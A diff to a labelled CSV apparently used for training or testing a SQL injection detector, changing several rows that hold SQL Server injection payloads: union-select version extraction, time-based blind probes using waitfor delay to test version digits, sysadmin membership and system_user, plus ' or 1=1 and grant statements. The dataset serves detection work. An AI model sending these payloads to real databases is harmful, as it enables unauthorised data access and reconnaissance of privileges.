@@ -4278,17 +4278,17 @@ docs,0
 ' grant connect to name; grant resource to name; --,1
 ' or 1=1 --,1
 ' union (select @@version) --,1
-' union (select NULL, (select @@version)) --,1
-' union (select NULL, NULL, (select @@version)) --,1
-' union (select NULL, NULL, NULL,  (select @@version)) --,1
-' union (select NULL, NULL, NULL, NULL,  (select @@version)) --,1
-' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --,1
-'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --,1
-'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --,1
-'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --,1
-'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --,1
-'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,1
-'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --,1
+' union (select NULL, (select @@version)) --',1
+' union (select NULL, NULL, (select @@version)) --',1
+' union (select NULL, NULL, NULL,  (select @@version)) --',1
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --',1
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --',1
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --',1
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --',1
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --',1
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --',1
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --',1
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --',1
 '; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,1
 '; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,1
 1'1,1
